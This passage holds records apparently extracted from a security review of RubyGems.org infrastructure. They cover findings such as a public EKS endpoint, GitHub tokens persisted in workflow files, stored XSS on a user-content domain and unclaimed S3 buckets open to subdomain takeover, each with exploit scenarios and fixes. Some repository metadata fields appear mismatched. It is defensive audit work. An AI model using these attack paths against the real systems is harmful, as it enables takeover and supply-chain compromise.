[rubygems-common-all](https://us-west-2.console.aws.amazon.com/vpcconsole/home?region=us-west-2#SecurityGroup:groupId=sg-9a6ddaff)\n  - This group is used by the arn:aws:elasticache:us-west-2:048268392960:cluster:shipit2 cluster. The cluster is not exposed outside of VPC, but opening port 22 is redundant, or at least the CIDR block is too open.\n- [rubygems-common-chef](https://us-west-2.console.aws.amazon.com/vpcconsole/home?region=us-west-2#SecurityGroup:groupId=sg-dec74dbb)\n  - This group is not used and appears to be a leftover.\n\nThe Amazon EKS (K8s) API endpoint is reachable through the public internet. The endpoint\\_public\\_access should be set to false to limit access to K8s admin endpoint.\n\n```\nvpc_config {\n security_group_ids = [aws_security_group.eks-cluster.id]\n endpoint_private_access = true\n endpoint_public_access = true\n```\n\n*Figure 24.1: Configuration enabling public K8s endpoint ([rubygems-terraform/eks.tf#57–60](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/eks.tf#L57-L60C5))*\n\nEKS-managed nodes have the associate\\_public\\_ip\\_address flag set to true. This results in public IPs being assigned to the nodes. The issue is not exploitable, as the external access is blocked by security groups; however, public IPs increase the chance of exploitable misconfigurations.\n\n```\nresource \"aws_launch_template\" \"eks-managed-nodes\" {\n  name = \"eks-managed-nodes\"\n```\n\n\n```\nnetwork_interfaces {\n  associate_public_ip_address = true\n  security_groups = [\n    aws_security_group.eks-node.id\n  ]\n}\n```\n\n*Figure 24.2: Configuration enabling automatic association of public IP addresses ([rubygems-terraform/eks.tf#416–424](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/eks.tf#L416-L424))*\n\nAll three subnets configured via Terraform have the map\\_public\\_ip\\_on\\_launch flag set to true. This configuration makes the AWS assign public IP addresses to new resources, which may unintentionally expose them to the internet. Please note that this flag and the associate\\_public\\_ip\\_address flag may [overwrite each](https://github.com/hashicorp/terraform/issues/10568) other.\n\n```\nresource \"aws_subnet\" \"main-a\" {\n vpc_id = aws_vpc.rubygems.id\n cidr_block = \"172.30.0.0/24\"\n availability_zone = \"us-west-2a\"\n map_public_ip_on_launch = true\n```\n\n*Figure 24.3: Configuration enabling automatic mapping of public IP addresses ([rubygems-terraform/subnets.tf#1–5](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/subnets.tf#L1-L5))*\n\nCurrently all resources with public IPs are protected by security groups and are not remotely reachable. For example, IP 52.38.177.176 (network interface eni-0bdca602657463234) has a security group that blocks any internet access.\n\nFinally, network ACLs are not used. These should be configured and should [correspond](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.html) to [security](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.html) groups of the VPC as a defense-in-depth mechanism.\n\n#### Exploit Scenario\n\nA vulnerability in Kubernetes is exploited by a third party by directly accessing the EKS K8s management endpoint. The attacker takes control of the cluster and installs backdoors into popular gems.\n\n#### Recommendations\n\nShort term, harden the network configuration by implementing the following recommendations:\n\n- Remove ingress port 22 from rubygems-common-all security group, or at least restrict the CIDR block to a few IP addresses. Remove the rubygems-common-chef security group.\n- [Disable public](https://docs.aws.amazon.com/eks/latest/userguide/cluster-endpoint.html#modify-endpoint-access) access to EKS management endpoint. See this EKS [control](https://docs.aws.amazon.com/securityhub/latest/userguide/eks-controls.html#eks-1) for more information.\n\n\n- Set the associate\\_public\\_ip\\_address flag to false in the EKS configuration. See this [CodeGuru](https://docs.aws.amazon.com/codeguru/detector-library/terraform/restrict-public-ip-ec2-terraform/) detector for more information.\n- Set the map\\_public\\_ip\\_on\\_launch flag to false for all subnets. See this [EC2](https://docs.aws.amazon.com/securityhub/latest/userguide/ec2-controls.html#ec2-15) [control](https://docs.aws.amazon.com/securityhub/latest/userguide/ec2-controls.html#ec2-15) for more information. For Load Balancers (that must have public IPs), either make the IP map explicit or move them to a separate subnet with the flag set to true.\n- Review public IP addresses assigned to AWS resources and remove them if they are not needed.\n\nLong term, add network ACLs that would create an additional layer of defense in case of misconfigurations.\n", "severity": null, "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-025", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 25, "page_start": 62, "title": "GitHub token may be exposed in packed data in a release-gem action", "short_summary": null, "description_md": "#### Description\n\nThe release-gem GitHub Action stores GitHub authentication tokens in the filesystem in the .git/config file. This may result in the tokens being leaked if action's user creates an artifact from the repository's root.\n\n```\nsteps:\n  - name: Set remote URL\n    run: |\n      # Attribute commits to the last committer on HEAD\n      git config --global user.email \"$(git log -1 --pretty=format:'%ae')\"\n      git config --global user.name \"$(git log -1 --pretty=format:'%an')\"\n      git remote set-url origin \"https://x-access-token:${{ github.token\n}}@github.com/$GITHUB_REPOSITORY\"\n```\n\n*Figure 25.1: Action saving GitHub token in the filesystem ([release-gem/action.yml#18–24](https://github.com/rubygems/release-gem/blob/612653d273a73bdae1df8453e090060bb4db5f31/action.yml#L18-L24))*\n\nThe severity of this finding is only informational, as a breaking [change was](https://github.com/actions/upload-artifact/issues/602) recently [introduced](https://github.com/actions/upload-artifact/issues/602) in the upload-artifact action that prevents uploads of hidden folders.\n", "full_markdown": "# 25. GitHub token may be exposed in packed data in a release-gem action\n\n| Severity: Informational        | Diffi culty: High      |\n|-----------------------------------|------------------------------|\n| Type: Data Exposure         | Finding ID: TOB-RGM-25 |\n| Target: release-gem/action.yml |                              |\n\n#### Description\n\nThe release-gem GitHub Action stores GitHub authentication tokens in the filesystem in the .git/config file. This may result in the tokens being leaked if action's user creates an artifact from the repository's root.\n\n```\nsteps:\n  - name: Set remote URL\n    run: |\n      # Attribute commits to the last committer on HEAD\n      git config --global user.email \"$(git log -1 --pretty=format:'%ae')\"\n      git config --global user.name \"$(git log -1 --pretty=format:'%an')\"\n      git remote set-url origin \"https://x-access-token:${{ github.token\n}}@github.com/$GITHUB_REPOSITORY\"\n```\n\n*Figure 25.1: Action saving GitHub token in the filesystem ([release-gem/action.yml#18–24](https://github.com/rubygems/release-gem/blob/612653d273a73bdae1df8453e090060bb4db5f31/action.yml#L18-L24))*\n\nThe severity of this finding is only informational, as a breaking [change was](https://github.com/actions/upload-artifact/issues/602) recently [introduced](https://github.com/actions/upload-artifact/issues/602) in the upload-artifact action that prevents uploads of hidden folders.\n\n#### Exploit Scenario\n\nAlice has a GitHub workflow for publishing her gem. Her workflow uses the release-gem action, and it produces an artifact after the action but before the workflow finishes. Mallory, an unprivileged user, steals GitHub tokens during workflow runs and uses them to install backdoors in Alice's gem.\n\n#### Recommendations\n\nShort term, remove the GitHub token from the \"Set remote URL\" step. If the token is necessary for some further steps, then insert the credentials explicitly in those steps in a way that will not make them persist in the filesystem (e.g., via the step's environment variables).\n\n#### References\n\n● Yaron Avital, 13 August, 2024, [\"ArtiPACKED:](https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/) Hacking Giants Through a Race\n\n\n\n#### [Condition](https://unit42.paloaltonetworks.com/github-repo-artifacts-leak-tokens/) in GitHub Actions Artifacts\"\n\n● GitHub documentation, \"Automatic token [authentication\"](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)\n", "severity": "Informational", "difficulty": "High", "type": "Data Exposure", "finding_id": "TOB-RGM-25", "target": {"path": "release-gem/action.yml", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/release-gem", "org": "rubygems", "name": "release-gem", "commit": "612653d273a73bdae1df8453e090060bb4db5f31", "branch": null, "relative_file": "release-gem/action.yml", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Exposure", "Finding ID": "TOB-RGM-25", "Target": "release-gem/action.yml"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-026", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 26, "page_start": 64, "title": "GitHub Action redundant persist-credentials", "short_summary": null, "description_md": "#### Description\n\nAll workflows (except the scorecards) in the rubygems.org and rubygems-terraform repositories use the default configuration for the actions/checkout action. The default configuration for the persist-credentials flag is true. This makes the action persist GitHub tokens in a filesystem.\n\nWhile this issue is not exploitable since the filesystem is never publicly exposed, the tokens' persistence seems to be not required by subsequent steps.\n", "full_markdown": "# 26. GitHub Action redundant persist-credentials\n\n| Severity: Informational                                                | Diffi culty: High      |\n|---------------------------------------------------------------------------|------------------------------|\n| Type: Data Exposure                                                 | Finding ID: TOB-RGM-26 |\n| Target: rubygems.org and rubygems-terraform GitHub Actions |                              |\n\n#### Description\n\nAll workflows (except the scorecards) in the rubygems.org and rubygems-terraform repositories use the default configuration for the actions/checkout action. The default configuration for the persist-credentials flag is true. This makes the action persist GitHub tokens in a filesystem.\n\nWhile this issue is not exploitable since the filesystem is never publicly exposed, the tokens' persistence seems to be not required by subsequent steps.\n\n#### Recommendations\n\nShort term, add explicit persist-credentials flags with false values to all actions/checkout actions used in workflows. If some steps need the GitHub credentials, then plumb them explicitly. Add the flag to the [releasing-gem](https://guides.rubygems.org/trusted-publishing/releasing-gems/) documentation so that users who are copy-pasting the code use the more secure configuration.\n\n# References\n\n● [The actions/checkout](https://github.com/actions/checkout/issues/485) Issue #485\n", "severity": "Informational", "difficulty": "High", "type": "Data Exposure", "finding_id": "TOB-RGM-26", "target": {"path": "rubygems.org and rubygems-terraform GitHub Actions", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/release-gem", "org": "rubygems", "name": "release-gem", "commit": "612653d273a73bdae1df8453e090060bb4db5f31", "branch": null, "relative_file": "rubygems.org and rubygems-terraform GitHub Actions", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Exposure", "Finding ID": "TOB-RGM-26", "Target": "rubygems.org and rubygems-terraform GitHub Actions"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-027", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 27, "page_start": 65, "title": "Fastly uses long-lived credentials instead of OIDC", "short_summary": null, "description_md": "#### Description\n\nTerraform configures the Fastly service to use long-lived AWS credentials for logging. OIDC is the recommended way of authenticating Fastly to AWS. In other words, a new AWS role should be created for Fastly, instead of an AWS user.\n\n```\nlogging_s3 {\n name = \"downloads\"\n format = \"%h now req.url %>s req.http.User-Agent\"\n format_version = 1\n bucket_name = var.downloads_bucket_name\n s3_access_key = var.downloads_s3_access_key\n s3_secret_key = var.downloads_s3_secret_key\n```\n\n*Figure 27.1: Configuration using long-lived AWS credentials for Fastly logging ([rubygems-terraform/fastly/modules/main.tf#279–285](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/modules/main.tf#L279-L285))*\n\nUnfortunately, Fastly does not allow OIDC-like authentication for accessing private S3 buckets as data sources (origins). Using long-lived AWS credentials is non-avoidable.\n", "full_markdown": "# 27. Fastly uses long-lived credentials instead of OIDC Severity: **Informational** Difficulty: **High** Type: Authentication Finding ID: TOB-RGM-27 Target: rubygems-terraform/fastly\n\n#### Description\n\nTerraform configures the Fastly service to use long-lived AWS credentials for logging. OIDC is the recommended way of authenticating Fastly to AWS. In other words, a new AWS role should be created for Fastly, instead of an AWS user.\n\n```\nlogging_s3 {\n name = \"downloads\"\n format = \"%h now req.url %>s req.http.User-Agent\"\n format_version = 1\n bucket_name = var.downloads_bucket_name\n s3_access_key = var.downloads_s3_access_key\n s3_secret_key = var.downloads_s3_secret_key\n```\n\n*Figure 27.1: Configuration using long-lived AWS credentials for Fastly logging ([rubygems-terraform/fastly/modules/main.tf#279–285](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/modules/main.tf#L279-L285))*\n\nUnfortunately, Fastly does not allow OIDC-like authentication for accessing private S3 buckets as data sources (origins). Using long-lived AWS credentials is non-avoidable.\n\n#### Recommendations\n\nShort term, consider implementing authentication for Fastly logs using AWS roles. This change should slightly improve security. However, this change requires creating both user and roles for Fastly, which would increase overall complexity.\n\n#### References\n\n● Fastly documentation, \"Log [streaming:](https://docs.fastly.com/en/guides/log-streaming-amazon-s3) Amazon S3\"\n", "severity": "Informational", "difficulty": "High", "type": "Authentication", "finding_id": "TOB-RGM-27", "target": {"path": "rubygems-terraform/fastly", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "rubygems-terraform/fastly", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Authentication", "Finding ID": "TOB-RGM-27", "Target": "rubygems-terraform/fastly"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-028", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 28, "page_start": 66, "title": "Stored XSS in gems.rubygemsusercontent.org", "short_summary": null, "description_md": "#### Description\n\nThe gems.rubygemsusercontent.org domain serves user-controlled files with either user-controlled or automatically deduced content types. This behavior enables users to create persistent XSS exploits in the domain.\n\nThe domain is different from the more important RubyGems.org, so the severity of this issue is very limited. However, users may trust the domain (as it belongs to Ruby Central), and instances of XSS inside it may be unexpected. Moreover, there seems to be no business value in serving user files with insecure content types.\n\nThe gems.rubygemsusercontent.org domain serves files from the contents.oregon.production.s3.rubygems.org S3 bucket (figures 28.1–2). The bucket holds objects created from gems source files (controlled by gems creators). The files are served with the HTTP response Content-Type header taken from the object's metadata (figure 28.3).\n\n```\ncontents = {\n host = \"gems.rubygemsusercontent.org\"\n bucket_name = \"contents.oregon.production.s3.rubygems.org\",\n}\n```\n\n*Figure 28.1: Part of the Fastly configuration ([rubygems-terraform/fastly/main.tf#126–129](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/main.tf#L126-L129))*\n\n```\ncondition {\n name = \"is_contents_s3_request\"\n priority = 9\n statement = \"req.http.host == \\\"${var.contents.host}\\\"\"\n type = \"REQUEST\"\n}\n```\n\n*Figure 28.2: Part of the Fastly configuration ([rubygems-terraform/fastly/modules/main.tf#185–190](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/modules/main.tf#L185-L190))*\n\n\n\n\n*Figure 28.3: Example AWS metadata entries*\n\nThe metadata is either controlled by gems owners or set automatically by AWS. In either case, publishing a gem with an HTML file is sufficient to create an XSS payload.\n\nAs an example, the [sogilis/csv\\\\_fast\\\\_importer](https://github.com/sogilis/csv_fast_importer/blob/7343092dca117d7d85c2885b90edcabae7195f5f/sample-app/public/422.html) repository stores a 422.html file. The file's reference can be found with [this](https://gems.rubygemsusercontent.org/gems/csv_fast_importer/paths/1.2.0/sample-app/public/422.html) link. Then, if opened with this [URL,](https://gems.rubygemsusercontent.org/gems/csv_fast_importer/contents/a699bce0b9481ae5ac7e8121cca1ded3573e369502d56c353311fe263a3569e7) the HTML file is served with the HTML content type.\n", "full_markdown": "# 28. Stored XSS in gems.rubygemsusercontent.org Severity: **Low** Difficulty: **Low** Type: Data Validation Finding ID: TOB-RGM-28 Target: AWS S3 buckets and Fastly\n\n#### Description\n\nThe gems.rubygemsusercontent.org domain serves user-controlled files with either user-controlled or automatically deduced content types. This behavior enables users to create persistent XSS exploits in the domain.\n\nThe domain is different from the more important RubyGems.org, so the severity of this issue is very limited. However, users may trust the domain (as it belongs to Ruby Central), and instances of XSS inside it may be unexpected. Moreover, there seems to be no business value in serving user files with insecure content types.\n\nThe gems.rubygemsusercontent.org domain serves files from the contents.oregon.production.s3.rubygems.org S3 bucket (figures 28.1–2). The bucket holds objects created from gems source files (controlled by gems creators). The files are served with the HTTP response Content-Type header taken from the object's metadata (figure 28.3).\n\n```\ncontents = {\n host = \"gems.rubygemsusercontent.org\"\n bucket_name = \"contents.oregon.production.s3.rubygems.org\",\n}\n```\n\n*Figure 28.1: Part of the Fastly configuration ([rubygems-terraform/fastly/main.tf#126–129](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/main.tf#L126-L129))*\n\n```\ncondition {\n name = \"is_contents_s3_request\"\n priority = 9\n statement = \"req.http.host == \\\"${var.contents.host}\\\"\"\n type = \"REQUEST\"\n}\n```\n\n*Figure 28.2: Part of the Fastly configuration ([rubygems-terraform/fastly/modules/main.tf#185–190](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/modules/main.tf#L185-L190))*\n\n\n\n\n*Figure 28.3: Example AWS metadata entries*\n\nThe metadata is either controlled by gems owners or set automatically by AWS. In either case, publishing a gem with an HTML file is sufficient to create an XSS payload.\n\nAs an example, the [sogilis/csv\\\\_fast\\\\_importer](https://github.com/sogilis/csv_fast_importer/blob/7343092dca117d7d85c2885b90edcabae7195f5f/sample-app/public/422.html) repository stores a 422.html file. The file's reference can be found with [this](https://gems.rubygemsusercontent.org/gems/csv_fast_importer/paths/1.2.0/sample-app/public/422.html) link. Then, if opened with this [URL,](https://gems.rubygemsusercontent.org/gems/csv_fast_importer/contents/a699bce0b9481ae5ac7e8121cca1ded3573e369502d56c353311fe263a3569e7) the HTML file is served with the HTML content type.\n\n#### Exploit Scenario\n\nMallory publishes a gem with a malicious HTML file. The file contains JavaScript payload for [BeEF](https://beefproject.com/). Mallory easily phishes users to visit the website, as the users believe the domain to be trusted.\n\n#### Recommendations\n\nShort term, find how the Content-Type metadata is created when uploading objects to S3 buckets. If the metadata is user-provided, then create an allowlist of content types. If the metadata is automatically deduced, then add an automatic request (sent after object creation) that would update the Content-Type metadata to text/plain or octet/stream.\n\nIn either case, configure Fastly to overwrite content types of HTTP responses when serving files from S3 buckets with text/plain and octet/stream.\n", "severity": "Low", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-RGM-28", "target": {"path": "AWS S3 buckets and Fastly", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/release-gem", "org": "rubygems", "name": "release-gem", "commit": "612653d273a73bdae1df8453e090060bb4db5f31", "branch": null, "relative_file": "AWS S3 buckets and Fastly", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-RGM-28", "Target": "AWS S3 buckets and Fastly"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-029", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 29, "page_start": 68, "title": "OIDC S3 buckets are not claimed but are configured in Fastly", "short_summary": null, "description_md": "#### Description\n\nThe Fastly configuration (figure 29.1) exposes a few subdomains of RubyGems.org with S3 buckets as data sources. The buckets are not claimed by anybody. An attacker can claim them, effectively taking control over the subdomains.\n\n```\ncontents = {\n host = \"gems.oidc-api-token.rubygemsusercontent.org\"\n bucket_name = \"contents.oregon.oidc-api-token.s3.rubygems.org\",\n}\ncompact_index = {\n bucket_name = \"compact-index.oregon.oidc-api-token.s3.rubygems.org\"\n}\ncompact_index_host = \"oidc-api-token.rubygems.org\"\n```\n\n*Figure 29.1: Vulnerable S3 buckets and subdomains ([rubygems-terraform/fastly/oidc-api-tokens.tf#34–42](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/oidc-api-tokens.tf#L34-L42))*\n\nThe issue can be observed [here.](https://oidc-api-token.rubygems.org/gems/tob.gem)\n", "full_markdown": "## 29. OIDC S3 buckets are not claimed but are configured in Fastly\n\n| Severity: Medium                                     | Diffi culty: High      |\n|---------------------------------------------------------|------------------------------|\n| Type: Configuration                                  | Finding ID: TOB-RGM-29 |\n| Target: rubygems-terraform/fastly/oidc-api-tokens.tf |                              |\n\n#### Description\n\nThe Fastly configuration (figure 29.1) exposes a few subdomains of RubyGems.org with S3 buckets as data sources. The buckets are not claimed by anybody. An attacker can claim them, effectively taking control over the subdomains.\n\n```\ncontents = {\n host = \"gems.oidc-api-token.rubygemsusercontent.org\"\n bucket_name = \"contents.oregon.oidc-api-token.s3.rubygems.org\",\n}\ncompact_index = {\n bucket_name = \"compact-index.oregon.oidc-api-token.s3.rubygems.org\"\n}\ncompact_index_host = \"oidc-api-token.rubygems.org\"\n```\n\n*Figure 29.1: Vulnerable S3 buckets and subdomains ([rubygems-terraform/fastly/oidc-api-tokens.tf#34–42](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/fastly/oidc-api-tokens.tf#L34-L42))*\n\nThe issue can be observed [here.](https://oidc-api-token.rubygems.org/gems/tob.gem)\n\n#### Exploit Scenario\n\nMallory finds out that the\n\ncompact-index.oregon.oidc-api-token.s3.rubygems.org S3 bucket is not registered. She registers it and stores malicious JavaScript payloads there. Mallory can conduct XSS-like attacks, try to circumvent CSRF protections, and exploit possible misconfigurations of the RubyGems.org application.\n\n#### Recommendations\n\nShort term, either claim the OIDC-related S3 buckets or remove relevant Fastly configurations.\n\nLong term, create a GitHub workflow that lists the S3 buckets referenced in the Fastly configuration. Check if the buckets are registered and if the owner of all the buckets is the expected AWS account.\n\n\nFor the first task (list S3 buckets), the terraform command can be used (the command is already used in the terraform.yml workflow). The second task requires AWS credentials; however, the terraform.yml workflow already has the github-actions-terraform AWS role, so it has necessary permissions for ownership checks.\n\nAlternatively, manage all S3 buckets exclusively through Terraform. With this change, all buckets will have to be referenced via variables (and not hard-coded ARN names), and if a bucket is deleted, it would not be possible to reference it.\n", "severity": "Medium", "difficulty": "High", "type": "Configuration", "finding_id": "TOB-RGM-29", "target": {"path": "rubygems-terraform/fastly/oidc-api-tokens.tf", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/sogilis/csv_fast_importer", "org": "sogilis", "name": "csv_fast_importer", "commit": "7343092dca117d7d85c2885b90edcabae7195f5f", "branch": null, "relative_file": "rubygems-terraform/fastly/oidc-api-tokens.tf", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Configuration", "Finding ID": "TOB-RGM-29", "Target": "rubygems-terraform/fastly/oidc-api-tokens.tf"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-030", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 30, "page_start": 70, "title": "IAM fastly user cannot list S3 objects", "short_summary": null, "description_md": "#### Description\n\nThe AWS fastly user does not have the s3:ListBucket permission for contents and compact-index buckets (in production and staging). As a result, an error is returned when opening, for example, the <https://gems.rubygemsusercontent.org/> URL. Moreover, the error is verbose and returns potentially sensitive information like AWS account ID and bucket name.\n\n*Figure 30.1: The error returned by Fastly for some websites*\n", "full_markdown": "| 30. IAM fastly user cannot list S3 objects |                              |\n|-----------------------------------------------------------------|------------------------------|\n| Severity: Informational                                      | Diffi culty: Low       |\n| Type: Error Reporting                                     | Finding ID: TOB-RGM-30 |\n| Target: AWS IAM, Fastly                                |                              |\n\n#### Description\n\nThe AWS fastly user does not have the s3:ListBucket permission for contents and compact-index buckets (in production and staging). As a result, an error is returned when opening, for example, the <https://gems.rubygemsusercontent.org/> URL. Moreover, the error is verbose and returns potentially sensitive information like AWS account ID and bucket name.\n\n*Figure 30.1: The error returned by Fastly for some websites*\n\n## Recommendations\n\nShort term, either add the s3:ListBucket permission to the fastly user or add a configuration to Fastly that would make the returned error less explicit.\n", "severity": "Informational", "difficulty": "Low", "type": "Error Reporting", "finding_id": "TOB-RGM-30", "target": {"path": "AWS IAM, Fastly", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/sogilis/csv_fast_importer", "org": "sogilis", "name": "csv_fast_importer", "commit": "7343092dca117d7d85c2885b90edcabae7195f5f", "branch": null, "relative_file": "AWS IAM, Fastly", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Error Reporting", "Finding ID": "TOB-RGM-30", "Target": "AWS IAM, Fastly"}}
